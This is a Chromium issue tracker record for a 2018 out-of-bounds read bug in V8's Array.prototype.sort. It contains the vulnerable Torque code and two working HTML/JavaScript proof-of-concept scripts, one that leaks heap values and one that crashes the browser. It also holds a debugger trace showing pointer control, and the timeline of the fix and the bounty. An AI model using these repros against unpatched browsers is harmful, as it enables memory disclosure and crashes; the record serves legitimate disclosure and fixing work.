# Security: OOB read in Array.prototype.sort

| Field | Value |
|-------|-------|
| **Issue ID** | [40091706](https://issues.chromium.org/issues/40091706) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | sz...@google.com |
| **Created** | 2018-06-19 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

<https://cs.chromium.org/chromium/src/v8/src/builtins/array-sort.tq?rcl=dd5dd45db8522e2c7b3b3b9ae80132b6d0b8bc24&l=185>  

macro ArrayInsertionSort<E : type>(  

context: Context, receiver: Object, elements: Object,  

initialReceiverMap: Object, initialReceiverLength: Number, from: Smi,  

to: Smi, userCmpFn: Object, sortCompare: CompareBuiltinFn)  

labels Bailout {  

for (let i: Smi = from + 1; i < to; ++i) {  

assert(CanUseSameAccessor<E>(  

context, receiver, initialReceiverMap, initialReceiverLength));

```
  let element: Object = Load<E>(context, elements, i) otherwise Bailout; // \*\*\*3\*\*\*  
  let j: Smi = i - 1;  
  for (; j >= from; --j) {  
    assert(CanUseSameAccessor<E>(  
        context, receiver, initialReceiverMap, initialReceiverLength));  

    let tmp: Object = Load<E>(context, elements, j) otherwise Bailout;  
    let order: Number = CallCompareFn<E>(  
        context, receiver, initialReceiverMap, initialReceiverLength,  
        userCmpFn, sortCompare, tmp, element)  
    otherwise Bailout;  
    if (order > 0) {  
      Store<E>(context, elements, j + 1, tmp);  
    } else {  
      break;  
    }  
  }  
  Store<E>(context, elements, j + 1, element);  
}  

```

}

[...]

macro ArrayQuickSortImpl<E : type>(  

context: Context, sortState: FixedArray, fromArg: Smi, toArg: Smi)  

labels Bailout {  

[...]  

while (to - from > 1) { // \*\*\*2\*\*\*  

if (to - from <= 10) {  

ArrayInsertionSort<E>(  

context, receiver, elements, initialReceiverMap,  

initialReceiverLength, from, to, userCmpFn, sortCompare)  

otherwise Bailout;  

break;  

}

[...]

```
  if ((to - high_start) < (low_end - from)) {  
    ArrayQuickSort<E>(context, sortState, high_start, to); // \*\*\*1\*\*\*  
    to = low_end;  
  } else {  
    ArrayQuickSort<E>(context, sortState, from, low_end);  
    from = high_start;  
  }  
}  

```

}

After making a recursive call to |ArrayQuickSort|(1), |ArrayQuickSortImpl| doesn't ensure it still can use the fast  

path to access the array. Therefore, in the next iteration of the loop(2), loads performed before the first call to  

|CallCompareFn|(3) might read OOB data.

**VERSION**  

Google Chrome 69.0.3452.0 (Official Build) dev (64-bit)  

Google Chrome 69.0.3465.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**  

This repro case shows leaked heap values:

<script>
let floatArray = new Float64Array(1),
intArray = new Uint32Array(floatArray.buffer);
function tohex(value) {
floatArray[0] = value;
return intArray[1].toString(16) + intArray[0].toString(16).padStart(8, "0");
}
function gc() {
for (let i = 0; i < 1024 \\* 1024 / 0x10; i++) {
let a = new String();
}
}
rand = n => Math.floor(Math.random() \\* n);
check = a => a === undefined || a.toString().length < 6;
oobValues = [];
for (let i = 0; i < 1000; ++i) {
array = [];
let len = rand(30);
for(let i = 0; i < len; ++i) {
array[i] = i + 0.1;
}
counter = 0;
array.sort((a, b) => {
if (!check(a)) {
oobValues.push(a);
}
if (!check(b)) {
oobValues.push(b);
}
if (counter++ == rand(30)) {
array.length = 1;
gc();
}
return a - b;
});
}
alert(oobValues.map(v => tohex(v)));
</script>

This one crashes Chrome:

<script>
function gc() {
for (let i = 0; i < 1024 \\* 1024 / 0x10; i++) {
let a = new String();
}
}
rand = n => Math.floor(Math.random() \\* n);
for (let i = 0; i < 1000; ++i) {
array = [];
let len = rand(30);
for(let i = 0; i < len; ++i) {
array[i] = [i + 0.1];
}
counter = 0;
array.sort((a, b) => {
a = a || [0];
b = b || [0];
if (counter++ == rand(30)) {
array.length = 1;
gc();
}
return a[0] - b[0];
});
}
</script>

The following assertion is hit in debug builds:  

assert 'CanUseSameAccessor<E>( context, receiver, elements, initialReceiverMap, initialReceiverLength)' failed at ../../src/builtins/array-sort.tq:194:6

## Attachments

- [repro.html](attachments/repro.html) (text/plain, 1022 B)

## Timeline

### cl...@chromium.org (2018-06-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5260957471997952.

### cl...@chromium.org (2018-06-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5378560051904512.

### cl...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### oc...@chromium.org (2018-06-20)

Assuming that this only impacts head per the report.

danno@, could you please take a look?

[Monorail components: Blink>JavaScript]

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### da...@chromium.org (2018-06-20)

Simon should look at this. Also including Jaro on CC, since this is exactly the type of problem we'd like to catch with more rigorous verification in Torque.

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-06-20)

[Comment Deleted]

### sh...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-20)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-06-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/3bcf2b83eb605b680eda707896ba294bf52dd3b2

commit 3bcf2b83eb605b680eda707896ba294bf52dd3b2
Author: Simon Zünd <szuend@google.com>
Date: Wed Jun 20 15:38:18 2018

[array] Change Array.p.sort bailout behavior from fast- to slow-path

This CL fixes a bug where execution would continue on a fast-path
even though a previous recursion step bailed to the slow path. This
would allow possibly illegal loads that could leak to JS.

Drive-by change: Instead of bailing to the slow-path on each recursion
step, we now bail completely and start the slow-path afterwards.

R=cbruni@chromium.org, jgruber@chromium.org

Bug: chromium:854299, v8:7382
Change-Id: Ib2fd5d85dbd0c3894d7775c4f62e053c31b5e5d1
Reviewed-on: https://chromium-review.googlesource.com/1107702
Commit-Queue: Simon Zünd <szuend@google.com>
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53892}
[modify] https://crrev.com/3bcf2b83eb605b680eda707896ba294bf52dd3b2/src/builtins/array-sort.tq
[add] https://crrev.com/3bcf2b83eb605b680eda707896ba294bf52dd3b2/test/mjsunit/regress/regress-crbug-854299.js


### jg...@chromium.org (2018-06-21)

Simon, this is fixed, right? The original Array.p.sort Torque implementation landed in 69, no backmerge needed:

https://chromiumdash.appspot.com/commit/aff803454745935ba7843257fcf10dce41dc33b1

### cl...@chromium.org (2018-06-21)

ClusterFuzz has detected this issue as fixed in range 53891:53892.

Detailed report: https://clusterfuzz.com/testcase?key=5378560051904512

Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: Ill
Crash Address: 0x7f242835f4e8
Crash State:
  v8::internal::__RT_impl_Runtime_AbortJS
  v8::internal::Runtime_AbortJS
  libv8.so
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=53811:53812
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=53891:53892

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5378560051904512

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-06-21)

ClusterFuzz testcase 5378560051904512 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-06-21)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### se...@gmail.com (2018-06-29)

Please note that although this is just an OOB read, it is a Security_Severity-High bug because an OOB value might be treated as a pointer
to a JS object (like in https://crbug.com/chromium/594574).

I've attached a repro case that demonstrates control over the pointer:
(3bcc.bd0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome_child!std::vector<v8::internal::Vector<const char>,std::allocator<v8::internal::Vector<const char> > >::_Emplace_reallocate<const char *,int &>+0x448c2:
00007ffa`541fc6b2 488b5aff        mov     rbx,qword ptr [rdx-1] ds:41414141`41414140=????????????????
0:000> k
Child-SP          RetAddr           Call Site
0000004d`db3fce68 000042ec`311c9cd1 chrome_child!std::vector<v8::internal::Vector<const char>,std::allocator<v8::internal::Vector<const char> > >::_Emplace_reallocate<const char *,int &>+0x448c2
0000004d`db3fce70 00000018`00000000 0x000042ec`311c9cd1
0000004d`db3fce78 00000000`00000000 0x00000018`00000000

### in...@chromium.org (2018-06-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-29)

And $4,000 for this - cheers!

### aw...@chromium.org (2018-06-29)

[Empty comment from Monorail migration]

### aw...@google.com (2018-08-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/854299?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091706)*
